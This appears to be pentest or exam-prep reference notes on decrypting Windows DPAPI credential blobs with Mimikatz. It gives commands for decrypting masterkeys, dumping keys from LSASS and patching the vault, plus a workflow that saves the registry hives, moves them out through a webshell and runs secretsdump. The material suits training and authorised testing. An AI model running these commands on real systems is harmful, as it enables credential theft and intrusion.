# DPAPI Credential Decryption Reference

## Overview
Windows Credential Manager stores credentials as DPAPI-encrypted blobs in:
- `C:\Users\<user>\AppData\Roaming\Microsoft\Credentials\<GUID>`
- `C:\Users\<user>\AppData\Local\Microsoft\Credentials\<GUID>`

Each credential blob is encrypted with a masterkey stored in:
- `C:\Users\<user>\AppData\Roaming\Microsoft\Protect\<SID>\<MasterKeyGUID>`

## Decryption Requirements by Account Type

### Local Users
- Masterkey encrypted with: user's password-derived key (SHA1/NTLM + SID)
- Decrypt with: `dpapi::masterkey /in:<mk_file> /sid:<SID> /password:<pass>` or `/hash:<ntlm>`
- DPAPI_SYSTEM keys only decrypt BACKUP portion (NOT usable for credential decryption)
- If password unknown and not crackable: BLOCKED without domain backup key

### Domain Users
- Masterkey has 3 portions: masterkey (password-derived), backupkey (DPAPI_SYSTEM), domainkey (DC backup key)
- Options to decrypt:
  1. User's password + SID: `dpapi::masterkey /in:<mk> /sid:<SID> /password:<pw>`
  2. DC domain backup key via RPC: `dpapi::masterkey /in:<mk> /rpc` (needs machine Kerberos context)
  3. DC backup key PVK file: `dpapi::masterkey /in:<mk> /pvk:<file>`
- DPAPI_SYSTEM machine/user keys → only decrypt backup portion (won't decrypt cred blob)

### Machine (SYSTEM) Context
- dwFlags 0x20000000 = "system" protected
- Still tied to the USER who created it (stored in their profile)
- CryptUnprotectData only works in the creating user's logon session

## Mimikatz Commands

```
# Identify which masterkey GUID is needed
dpapi::cred /in:<credential_file>
→ Shows guidMasterKey field

# Decrypt masterkey (local user with password)
dpapi::masterkey /in:<mk_file> /sid:<SID> /password:<pass>

# Decrypt masterkey (domain user via RPC to DC)
dpapi::masterkey /in:<mk_file> /rpc

# Decrypt masterkey (with DPAPI_SYSTEM - backup only)
dpapi::masterkey /in:<mk_file> /system:0x<dpapi_machine_key>

# Decrypt credential with decrypted masterkey
dpapi::cred /in:<cred_file> /masterkey:<64_byte_hex_key>

# Dump all DPAPI keys from LSASS (only for logged-in users)
sekurlsa::dpapi

# Patch vault credentials (current SYSTEM context)
vault::cred /patch
```

## Key Pitfalls
1. backup key ≠ master key: decrypting backup portion gives a different key than masterkey portion
2. `sha1(key)` output after backup decryption is NOT usable for credential decryption
3. Domain users without DC backup key access = BLOCKED (no amount of local DPAPI_SYSTEM keys helps)
4. `sekurlsa::dpapi` only shows keys for CURRENTLY LOGGED IN users
5. `vault::cred /patch` works for SYSTEM context vault creds (cmdkey-stored)
6. `/rpc` needs machine's Kerberos context to DC — fails if MS-BKRP service denies access (error 0x0000000c)

## Extraction Workflow (SecOps Exam Pattern)
1. `reg save HKLM\SAM`, `reg save HKLM\SYSTEM`, `reg save HKLM\SECURITY`
2. Transfer hives (base64 chunks via webshell for large files)
3. `impacket secretsdump` locally: SAMHashes + LSASecrets (DPAPI_SYSTEM keys)
4. Enumerate credential files across all user profiles
5. Match guidMasterKey → find masterkey file in user's Protect folder
6. Try decryption paths in order: password → NTLM+SID → DPAPI_SYSTEM → RPC → DC backup key
